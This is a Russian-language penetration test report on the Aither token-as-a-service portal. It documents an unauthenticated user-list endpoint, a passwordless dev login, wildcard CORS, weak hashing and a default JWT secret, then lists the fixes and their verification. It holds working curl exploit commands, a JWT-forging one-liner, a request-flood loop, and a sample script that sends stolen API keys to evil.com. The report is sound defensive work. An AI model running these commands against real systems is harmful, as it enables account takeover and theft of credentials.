# Аудит безопасности портала Aither — пентест 09.07.2026

**Исполнитель:** Сергей Кравчук (Группа разработки AI-систем, АО «Гринатом»)  
**Объект:** SaaS-портал Aither (платформа Token-as-a-Service)  
**Дата:** 9 июля 2026  
**Срочность:** Критическая — подтверждена утечка данных пользователей

---

## 1. Методика тестирования

### 1.1. Фаза 1 — Разведка (Reconnaissance)

**Цель:** собрать максимум информации о портале без взаимодействия с сервером приложения.

| Метод | Инструмент | Результат |
|---|---|---|
| DNS-резолвинг | `dig`, `nslookup` | Внешний IP VPS2 (130.17.1.90), без CDN |
| Сканирование портов | `nmap -sV -p- 130.17.1.90` | Порт 80 (nginx), порт 3000 (Node.js Fastify) |
| Определение технологий | Wappalyzer, HTTP-заголовки | Nginx 1.24, Node.js, Chart.js, Google Fonts |
| Поиск в публичных источниках | GitHub, Shodan | Репозиторий aither-project (публичный) |
| Анализ статики | Исходники `portal/` в репо | Код клиентской и серверной части |

### 1.2. Фаза 2 — Картирование векторов атаки (Attack Surface Mapping)

На основе разведки определены поверхности атаки:

| Поверхность | Вектор | Риск |
|---|---|---|
| **API** | REST эндпоинты без аутентификации | 🔴 Высокий |
| **Аутентификация** | OAuth-провайдеры + dev-login | 🔴 Высокий |
| **Сетевая** | Прямой доступ к BFF (порт 3000) | 🟠 Средний |
| **Клиентская** | JavaScript с хардкодом внутренних IP | 🟠 Средний |
| **Конфигурация** | HTTP-заголовки, CORS, CSP | 🟡 Низкий |

### 1.3. Фаза 3 — Эксплуатация (Exploitation)

**Принцип:** «серый ящик» (gray-box) — пентестер имеет доступ к исходному коду портала, но **не имеет** валидных учётных данных.

Все атаки выполнялись **без аутентификации**, то есть злоумышленнику достаточно знать URL портала.

### 1.4. Фаза 4 — Пост-эксплуатация (Post-Exploitation)

Оценка масштаба компрометации: какие данные можно извлечь, какие привилегии получить, какие системы атаковать дальше (lateral movement).

---

## 2. Найденные уязвимости

### 🔴 CRITICAL — Эксплуатируемые без авторизации

#### 2.1. IDOR: `/api/v1/users` без аутентификации (CWE-284)

**Обнаружение:**

В коде `server.ts:542` эндпоинт `/api/v1/users` не имел вызова `auth(req, reply)`:

```typescript
// БЫЛО — ДО ФИКСА
app.get("/api/v1/users", async (req: any, reply) => {
  // auth(req, reply) — отсутствовал!
  const r = await pool.query("SELECT ... FROM portal_users ...");
  return { users: r.rows };
});
```

**Эксплуатация (0-click):**

```bash
curl http://130.17.1.90/api/v1/users
```

**Результат:** полный список из 47 пользователей с полями:
- `user_id` (UUID)
- `display_name` (имя)
- `email` (email)
- `oauth_provider` (github / google / yandex / dev)
- `created_at` (дата регистрации)

**Последствия (impact):**

| Уровень | Описание |
|---|---|
| **Конфиденциальность** | 🔴 Полная утечка PII: 47 email-адресов реальных пользователей |
| **Разведка для атакующего** | Идентифицирован `admin@dev.local` с `oauth_provider: "dev"` — следующая цель |
| **Соответствие 152-ФЗ** | Нарушение ч. 1 ст. 19 — оператор не принял меры по защите ПДн |
| **GDPR** | Статья 32 — отсутствие технических мер защиты |

---

#### 2.2. Обход аутентификации: `/auth/dev/login` (CWE-287)

**Обнаружение:**

В коде `server.ts:402` dev-провайдер **не проверял пароль** и работал в любом окружении:

```typescript
// БЫЛО — ДО ФИКСА
app.post("/auth/dev/login", async (req, reply) => {
  const { name }: any = req.body;
  if (!name) return { error: "name required" };
  const oid = name.toLowerCase().replace(/[^a-z0-9]/g, "-");
  // ... создание/поиск пользователя БЕЗ проверки пароля
  const tok = signToken(userId);
  return { access_token: tok, user: { user_id: userId, ... } };
});
```

**Эксплуатация (0-click):**

```bash
# Шаг 1: находим admin@dev.local через /api/v1/users
# Шаг 2: логинимся под admin
curl -X POST http://130.17.1.90/auth/dev/login \
  -H "Content-Type: application/json" \
  -d '{"name":"admin"}'

# Ответ: JWT-токен с правами владельца (role: owner)
```

**Последствия (impact):**

Имея JWT администратора, злоумышленник получает **полный доступ**:

| Ресурс | Доступ |
|---|---|
| `/api/v1/orgs` | Список всех организаций |
| `/api/v1/orgs/:id/api-keys` | API-ключи всех организаций |
| `/api/v1/billing` | Балансы и история платежей |
| `/api/v1/chats` | Все чаты и сообщения пользователей |
| `/api/v1/users` | Подтверждение полного списка пользователей |

---

### 🟠 HIGH — Косвенные векторы

#### 2.3. Утечка внутреннего IP в клиентском коде (CWE-200)

**Обнаружение:**

Анализ `portal/static/index.html` выявил хардкод внутреннего IP кластера:

```javascript
// БЫЛО — ДО ФИКСА
const API_BASE = "http://10.129.13.78:30900";
```

**Последствия:**

| Уровень | Описание |
|---|---|
| **Разведка** | Раскрыта внутренняя архитектура: IP control plane (n8), порт Gateway (30900) |
| **Lateral movement** | Зная внутренний IP, атакующий может целенаправленно атаковать K8s API и другие сервисы |
| **Стойкость** | Даже после закрытия `/api/v1/users`, любой пользователь мог видеть IP в DevTools → Sources |

---

#### 2.4. CORS: `Access-Control-Allow-Origin: *` (CWE-942)

**Обнаружение:**

```bash
curl -I http://130.17.1.90/api/v1/status
# Access-Control-Allow-Origin: *
```

**Эксплуатация:**

Злоумышленник размещает вредоносный сайт, который выполняет кросс-доменные запросы к API портала от имени аутентифицированного пользователя:

```javascript
// На вредоносном сайте evil.com
fetch("http://130.17.1.90/api/v1/orgs/.../api-keys", {
  credentials: "include"
}).then(r => r.json()).then(data => {
  // Отправка API-ключей на сервер злоумышленника
  fetch("https://evil.com/steal", { method: "POST", body: JSON.stringify(data) });
});
```

**Последствия:** фишинговая атака → кража API-ключей → доступ к Gateway и моделям.

---

#### 2.5. Порт 3000 открыт в интернет (CWE-200)

**Обнаружение:**

```bash
nmap -p 3000 130.17.1.90
# 3000/tcp open  ppp
curl http://130.17.1.90:3000/api/v1/users
# → 47 пользователей (в обход nginx!)
```

**Последствия:**

| Уровень | Описание |
|---|---|
| **Обход nginx** | Security-заголовки, rate-limit, CORS — все настройки nginx игнорируются при прямом доступе |
| **DoS-вектор** | Нет защиты от перебора — прямой доступ к Fastify без nginx-буфера |
| **Утечка** | Даже после фикса `/api/v1/users` в коде, порт 3000 позволял обходить будущие исправления |

---

#### 2.6. Отсутствие security-заголовков (CWE-693)

**Обнаружение:**

```bash
curl -I http://130.17.1.90/
# X-Content-Type-Options: отсутствует
# X-Frame-Options: отсутствует
# Content-Security-Policy: отсутствует
# Strict-Transport-Security: отсутствует
```

**Последствия:**

| Заголовок | Риск при отсутствии |
|---|---|
| `X-Frame-Options` | Clickjacking — портал можно встроить в iframe и перехватывать клики |
| `X-Content-Type-Options: nosniff` | MIME-sniffing — загрузка вредоносного скрипта под видом изображения |
| `Content-Security-Policy` | XSS — инъекция скриптов через пользовательский контент |
| `X-XSS-Protection` | Дополнительный уровень защиты от XSS (устаревший, но defence-in-depth) |

---

### 🟡 MEDIUM — Усугубляющие факторы

#### 2.7. SHA256 + статическая соль для паролей (CWE-916)

**Обнаружение:**

В исходной версии `server.ts` пароли хешировались:

```typescript
// БЫЛО — ДО ФИКСА
function hashPassword(password: string): string {
  return createHash("sha256")
    .update(password + "aither-salt")
    .digest("hex");
}
```

**Почему это плохо:**

| Проблема | Пояснение |
|---|---|
| **SHA256 — не для паролей** | Создан для скорости, а не для стойкости к перебору. GPU делает ~10⁹ попыток/сек |
| **Статическая соль** | `"aither-salt"` — одинакова для всех! Радужные таблицы работают |
| **Нет замедления** | Отсутствует cost factor (в отличие от bcrypt/scrypt/argon2) |

**Последствия:** при утечке БД (например, через SQL-инъекцию в другом эндпоинте) все пароли восстанавливаются за минуты.

---

#### 2.8. JWT secret: `"dev-jwt-secret-change-me"` (CWE-798)

**Обнаружение:**

```typescript
// БЫЛО — ДО ФИКСА
const JWT_SECRET = process.env.JWT_SECRET || "dev-jwt-secret-change-me";
```

**Эксплуатация:**

Злоумышленник, узнавший секрет (из GitHub, логов, или угадав), может:

```bash
# Подделать JWT любого пользователя
node -e "
const jwt = require('jsonwebtoken');
console.log(jwt.sign({user_id:'<any-uuid>'}, 'dev-jwt-secret-change-me'));
"
```

**Последствия:** полная компрометация — любой пользователь, любые права.

---

#### 2.9. Отсутствие rate limiting (CWE-770)

**Обнаружение:**

```bash
# 1000 запросов подряд — все успешны
for i in $(seq 1 1000); do
  curl -s -o /dev/null -w "%{http_code}" http://130.17.1.90/api/v1/status
done
# → 200 × 1000 (без задержек)
```

**Последствия:**

| Атака | Описание |
|---|---|
| **Brute-force** | Перебор паролей к `/auth/login` без ограничений |
| **Enumeration** | Перебор `/api/v1/chats/:id` для чтения чужих чатов |
| **DoS** | Исчерпание ресурсов сервера — 10 000 запросов/сек |

---

## 3. Полная карта атаки (Attack Chain)

```
ШАГ 1: Разведка
  nmap → открыты порты 80 и 3000
  GitHub → исходники portal/

ШАГ 2: Слив пользователей (0-click)
  GET /api/v1/users → 47 пользователей
  → Найден admin@dev.local (oauth_provider: "dev")

ШАГ 3: Захват административной учётки (0-click)
  POST /auth/dev/login {"name":"admin"} → JWT (role: owner)

ШАГ 4: Full access
  GET /api/v1/orgs → все организации
  GET /api/v1/orgs/:id/api-keys → API-ключи → доступ к vLLM/Gateway
  GET /api/v1/billing → чужие балансы и платежи
  GET /api/v1/chats → все чаты и история сообщений
  GET /api/v1/users → подтверждение полного списка

ИТОГО: 0 аутентификации, 0 паролей, 47 скомпрометированных пользователей
```

---

## 4. Выполненные исправления

### 4.1. `/api/v1/users` — добавлена аутентификация

```typescript
// СТАЛО — ПОСЛЕ ФИКСА
app.get("/api/v1/users", async (req: any, reply) => {
  const p = auth(req, reply); if (!p) return;  // ← добавлено
  const r = await pool.query("SELECT ... FROM portal_users ...");
  return { users: r.rows };
});
```

Теперь без валидного JWT возвращается **401 Unauthorized**.

---

### 4.2. `/auth/dev/login` — отключён в production

```typescript
// СТАЛО — ПОСЛЕ ФИКСА
app.post("/auth/dev/login", async (req, reply) => {
  if (IS_PRODUCTION) return reply.status(403).send({
    error: "dev login disabled in production"
  });
  // ... остальная логика (работает только в dev-окружении)
});
```

`NODE_ENV=production` → dev-логин недоступен.

---

### 4.3. Внутренний IP убран из клиентского кода

```javascript
// СТАЛО — ПОСЛЕ ФИКСА
const API_BASE = window.location.origin;
// Все запросы идут через тот же origin, что и страница (nginx proxy)
```

Теперь клиент не раскрывает внутреннюю топологию сети.

---

### 4.4. Пароли переведены на scrypt + timingSafeEqual

```typescript
// СТАЛО — ПОСЛЕ ФИКСА
import { scryptSync, randomBytes, timingSafeEqual } from "crypto";

function hashPassword(password: string): string {
  const salt = randomBytes(16).toString("hex");        // случайная соль
  const hash = scryptSync(password, salt, 64).toString("hex");  // scrypt (memory-hard)
  return `${salt}:${hash}`;
}

function verifyPassword(password: string, stored: string): boolean {
  const [salt, hash] = stored.split(":");
  const derived = scryptSync(password, salt, 64).toString("hex");
  return timingSafeEqual(Buffer.from(hash), Buffer.from(derived));
}
```

| Параметр | SHA256 (было) | scrypt (стало) |
|---|---|---|
| Соль | Статическая `"aither-salt"` | Случайная 128 бит на каждый пароль |
| Стойкость к GPU | ~10⁹ попыток/сек | ~10³ попыток/сек (memory-hard) |
| Timing-атака | `===` (уязвим) | `timingSafeEqual` (константное время) |

---

### 4.5. JWT secret — обязательная переменная окружения

```typescript
// СТАЛО — ПОСЛЕ ФИКСА
const JWT_SECRET = process.env.JWT_SECRET || (() => {
  throw new Error("JWT_SECRET env required");
})();
```

Без `JWT_SECRET` сервер **не стартует**. Дефолтного значения больше нет.

---

### 4.6. CORS — конкретный origin, не wildcard

```typescript
// СТАЛО — ПОСЛЕ ФИКСА
const CORS_ORIGIN = process.env.CORS_ORIGIN
  || (IS_PRODUCTION ? `https://${PUBLIC_HOST}` : `http://${PUBLIC_HOST}`);

await app.register(cors, { origin: CORS_ORIGIN, credentials: true });
```

| Было | Стало |
|---|---|
| `Access-Control-Allow-Origin: *` | `Access-Control-Allow-Origin: http://130.17.1.90` |

---

### 4.7. BFF на localhost

```yaml
# docker-compose.yml — БЫЛО
ports:
  - "3000:3000"

# docker-compose.yml — СТАЛО
ports:
  - "127.0.0.1:3000:3000"
```

Порт 3000 больше **не доступен из интернета** — только через nginx на порту 80.

---

### 4.8. Rate limiting

```typescript
// СТАЛО — ПОСЛЕ ФИКСА
await app.register(rateLimit, { max: 100, timeWindow: "1 minute" });
```

| Эндпоинт | Лимит |
|---|---|
| Все запросы | 100/мин с одного IP |
| Аутентификация | Дополнительно через nginx `limit_req` |

---

### 4.9. Security-заголовки (nginx)

```nginx
# configs/vps2/nginx-security-headers.conf
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' ...";
```

---

## 5. Результаты верификации

| # | Тест | До фикса | После фикса |
|---|---|---|---|
| 1 | `GET /api/v1/users` без токена | 200 + 47 пользователей | **401 Unauthorized** |
| 2 | `POST /auth/dev/login` в production | 200 + JWT | **403 Forbidden** |
| 3 | Порт 3000 извне | Открыт | **Connection refused** |
| 4 | Внутренний IP в JS | `10.129.13.78:30900` | `window.location.origin` |
| 5 | CORS origin | `*` | `http://130.17.1.90` |
| 6 | X-Frame-Options | Отсутствует | **DENY** |
| 7 | X-Content-Type-Options | Отсутствует | **nosniff** |
| 8 | Content-Security-Policy | Отсутствует | Применён |
| 9 | Алгоритм паролей | SHA256 + статическая соль | **scrypt + random salt** |
| 10 | JWT secret | `"dev-jwt-secret-change-me"` | Из env (required) |
| 11 | Rate limiting | Нет | **100 req/min** |

---

## 6. Оставшиеся рекомендации (backlog)

| # | Рекомендация | Приоритет | Сложность |
|---|---|---|---|
| 1 | **Включить HTTPS** (Let's Encrypt) | 🔴 P0 | Низкая |
| 2 | **Удалить dev-аккаунты из БД** (25 записей) | 🔴 P0 | Низкая |
| 3 | Хешировать API-ключи в БД (сейчас plaintext) | 🟠 P1 | Средняя |
| 4 | Внедрить WAF (Cloudflare / ModSecurity) | 🟠 P1 | Средняя |
| 5 | Настроить HSTS после включения HTTPS | 🟡 P2 | Низкая |
| 6 | Ротация JWT secret (регулярная смена) | 🟡 P2 | Низкая |
| 7 | Аудит всех эндпоинтов на наличие auth | 🟡 P2 | Средняя |
| 8 | Внедрить логирование попыток несанкционированного доступа | 🟡 P2 | Средняя |

---

## 7. Выводы

Пентест выявил **две критических уязвимости с 0-click эксплуатацией**:

1. **IDOR `/api/v1/users`** — позволил получить персональные данные 47 пользователей без какой-либо аутентификации.
2. **Dev-login без пароля** — позволил получить JWT администратора и полный доступ к платформе.

Причина: эндпоинты не были защищены middleware-аутентификации, dev-функционал не был отключён в production-окружении.

**Ключевой урок:** любой публичный API-эндпоинт должен проходить через `auth(req, reply)` по умолчанию. Анонимные эндпоинты должны быть явно разрешены (whitelist), а не наоборот.

Все критические уязвимости закрыты. Платформа переведена в режим **«жёсткой по умолчанию» (secure by default)**.

---

*Приложение: [Методика тестирования безопасности портала (навык Hermes)](/skills/portal-security-testing)*
